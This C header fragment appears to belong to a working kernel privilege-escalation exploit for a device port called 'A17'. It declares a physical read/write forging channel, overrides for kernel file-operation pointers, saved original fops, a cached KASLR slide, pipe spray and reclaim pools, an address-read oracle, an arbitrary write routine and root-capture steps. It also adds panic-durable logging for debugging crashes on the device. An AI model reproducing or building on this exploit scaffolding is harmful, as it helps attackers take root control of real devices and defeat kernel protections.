...
/* A17: route CPU is runtime-selectable (GHOSTLOCK_CORE env, see util.c).
 * All pin_to_core(CORE) sites follow it; consumer lands on CORE+1. */
...
/* ---------------- A17 port: rwforge / route-root (main.c + rwforge_a17.c) */
/* Runtime-sized pipe ring pools (GL_PIPE_SLABS, see run_rwforge). */
extern int pipe_drain_cnt;
extern int pipe_reclaim_cnt;
#define PIPE_DRAIN_RT   ((size_t)pipe_drain_cnt)
#define PIPE_RECLAIM_RT ((size_t)pipe_reclaim_cnt)

/* pipe_reclaim.c */
int pipe_read_full(int fd, void *buf, size_t len);
int pipe_write_full(int fd, const void *buf, size_t len);
int pipe_reclaim_read_fd(size_t i);
int pipe_reclaim_write_fd(size_t i);

/* rwforge_a17.c — marching-forger phys R/W channel */
...
extern uintptr_t fops_write_iter_override;
extern uintptr_t fops_ioctl_override;
extern uintptr_t fops_release_override;
extern int pselect_value_page_base;
extern int defer_carriers_n;

/* main.c — rwforge plumbing */
#define RWF_SELF_PAGE 1ULL /* rw_trigger parent sentinel: this round's own spray struct page */
int rw_trigger(uintptr_t parent, uintptr_t target);
int rw_page_ok(void);
extern uintptr_t rw_page;
extern void *g_child_shm;
extern uint8_t g_no_punch;
extern uintptr_t g_cfg_buf;
extern int g_fastroot;
extern uint8_t g_slide_valid;
extern uint64_t g_slide_cached;
extern uint8_t g_bringup_leaked;
extern uintptr_t g_bringup_F;
extern uint64_t g_bringup_orig_fmode;
extern uintptr_t g_bringup_orig_fops;
extern uintptr_t g_bringup_orig_priv;

#define PERF_TASK_MAX_CANDS 8
#define PERF_FILE_MAX_CANDS 8
extern int perf_task_ncands;
extern uintptr_t perf_task_cands[PERF_TASK_MAX_CANDS];
extern int perf_task_cand_votes[PERF_TASK_MAX_CANDS];
extern int perf_file_ncands;
extern uintptr_t perf_file_cands[PERF_FILE_MAX_CANDS];

int run_rwforge(void);
int run_bootid_oracle(int argc, char **argv);
int bootid_oracle_read8(uintptr_t addr, uint64_t *out);
void run_root_captures(void);
...
int cfg_write8(int fd, uintptr_t addr, uint64_t val);

/* A17 rebuild: panic-durable logging. Kernel panics mid-run used to cost us
 * the whole on-device log (F2FS uncommitted writes vanish). Every printed
 * line is now flushed and fsync'd to the log fd immediately. Interposed on
 * printf/puts/system so the pr_* macros (which expand to printf) and direct
 * calls are all covered. A macro is not re-expanded within its own
 * expansion, so the inner calls hit the real libc functions. */
static inline void log_durable_flush(void) {
  fflush(stdout);
  fsync(STDOUT_FILENO);
}
#define printf(...) \
  (printf(__VA_ARGS__), log_durable_flush())
#define puts(s) \
  (puts(s), log_durable_flush())
#define system(cmd) \
  ({ int _sysrc = system(cmd); log_durable_flush(); _sysrc; })
